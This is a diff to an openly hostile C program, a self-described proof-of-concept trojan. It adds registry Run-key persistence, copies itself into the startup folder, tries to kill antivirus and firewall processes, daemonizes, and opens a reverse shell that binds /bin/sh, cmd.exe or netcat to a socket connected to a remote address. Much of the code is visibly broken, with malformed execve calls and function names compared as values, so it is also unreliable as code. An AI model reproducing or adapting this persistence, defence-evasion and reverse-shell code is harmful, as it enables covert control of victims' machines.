@@ -11,6 +11,8 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
 // use without abuse.
 
+// POC!
+
 // coder  mrx6s0
 
 */
@@ -34,31 +36,33 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 #define false 0
 #define true 1
 
+
 /* struct of configurations to target. */
 
-  typedef struct client {
+  typedef struct {
 
-  char REMOTE_ADDR;
-  int REMOTE_PORT;
+  char REMOTE_ADDR; /*remote_addr */
+  int REMOTE_PORT; /* remote port */
   int x;
 
-  } Client;
+  } Target;
 
   x = 1;
 
+
   void error (char *err)
 
- {
+  {
 
   perror(err);
   exit(EXIT_FAILURE);
 
- } /* exit without exceptions... and keep the routine.
+  } /* exit without exceptions... and keep the routine.
 
 
   //function  to disable antivirus. */
 
-void kill_antivirus()
+  void kill_antivirus()
 
   {
      //int i;
@@ -69,7 +73,7 @@ void kill_antivirus()
         return;
     else
        while( (arq=fgetc(arq)) != 'EOF')
-         if (arq = "\n")
+         if (arq = '\n')
 
    execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);
 //   send(x,"Killing anti virus...\n",31,0);
@@ -77,14 +81,16 @@ void kill_antivirus()
 
    return;
 
-}
 
-/* in this, i use a .vbs file, and invoked from execv(); */
+   }
 
-void kill_firewall()
+/* in this, i use a .vbs file, and invoked from execve(); */
+
+  void kill_firewall()
 
   {
-
+	  
+   dup2(x, 0);
    execve("firewall.vbs", 0, 0);
 
    return;
@@ -93,38 +99,48 @@ void kill_firewall()
 
   // function that auto copy the software into the register of target machine
 
-void auto_copy()
+  void auto_copy()
 
   {
+
+     dup2(x, 0);
 
      execve("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wins32.exe",0,0);
      return;
 
   }
 
-void copy_to_registry()
+  void copy_to_registry()
 
   {
+
+    dup2(x, 0);
+    dup2(x,1);
+
     execve("copy /Y wins32.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar", 0, 0);
+    execve("cp wins32.exe /usr",NULL,NULL); /* for  linux systems, probably will failed... */
+
     return;
   }
 
+
   /*função para o programa rodar em background, como um deamon
 
+
    create connection */
+
   void shell()
 
   {
 
     struct sockaddr_in s;
-    //int ret;
     int root;
-
-    //char *window[] = {"#",0};
     char *window[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
     char *cmd[] = { "/bin/sh", (char *)0 };
-
-    XFreeCursor;
+ 
+   /* the daemon thing... */
+	  
+    XFreeCursor; 
 
     pid_t pid;
 	pid = fork();
@@ -162,16 +178,15 @@ void copy_to_registry()
 
     /* setting up the connection */
 
-     s.sin_family = AF_INET;
+     memset(s.sin_zero, '\0', sizeof s.sin_zero); /*aloca espaço de memória para o PIPE socket. */
+     s.sin_family = AF_INET; /* família de protocolos */
      s.sin_addr.s_addr = inet_addr(remote_addr);
      s.sin_port = htons(remote_port);
 
-     memset(s.sin_zero, '\0', sizeof s.sin_zero);
-
-     x = socket(AF_INET, SOCK_STREAM, 0);
+     x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */
 
     /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
-                   comment this if u think necessary...    */
+                   discomment this if u think necessary... */
 
      (connect(x, (struct sockaddr *)&s, sizeof(s)));
      if (connect == -1)
@@ -181,7 +196,9 @@ void copy_to_registry()
      perror("setsockopt(SO_REUSEADDR)failed");
 
      /* don't freeze the memory, dude */
-     sleep(5);
+
+     sleep(5); /* sleep for 5 sec */
+
      /*enter in a shell, finally */
 
      send(x,"\nsocket created\n",18,0), send(x,"\nConnected in machine\n",22,0);
@@ -192,56 +209,50 @@ void copy_to_registry()
      fflush(stdout);
      dup2(x, 0),dup2(x, 1),dup2(x, 2);
      root = execve("/bin/sh", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);
-     while(1);
+
+     while(true);
+
 
      }
 
-     return;
 
-     }
+}
 
-/* execute the program */
+     /* execute the program */
 
      int main(int argc, char **argv)
 
      {
 
-      int l;
+      //guarante that this functions will run after the shell
 
-    /* guarante that this functions will run after the shell
+      //  will veryfic if the condition is true, if not, will repeat 5 times and keep the routine.//
 
-     will veryfic if the condition is true, if not, will repeat 100 times and keep the routine.*/
-
-
-      for(l=1;l>=5;l++)
+      // for(l<=0;l>=5;l++)
 
       {
 
-      auto_copy();
       if(auto_copy == -1)
-      perror("error in_auto_copy");
+      perror("error in auto_copy");
       else
-         auto_copy();
-      copy_to_registry();
+           auto_copy();
       if(copy_to_registry == 0)
       perror("error copying to registry");
       else
           copy_to_registry();
-      kill_antivirus();
       if(kill_antivirus == -1)
       perror("kill anti virus failed...");
       else
-        kill_antivirus();
-      kill_firewall();
+          kill_antivirus();
       if(kill_firewall == 0)
       perror("kill firewall failed... retrying");
       else
           kill_firewall();
-      sleep(5);
+      sleep(0.2);
 
       }
 
-    /* shell run while the connection for true */
+    /*shell run while the connection for true */
 
       do {
 
@@ -250,6 +261,7 @@ void copy_to_registry()
       fflush(stdout);
 
       }
+
 
       while (connect == (true));
 
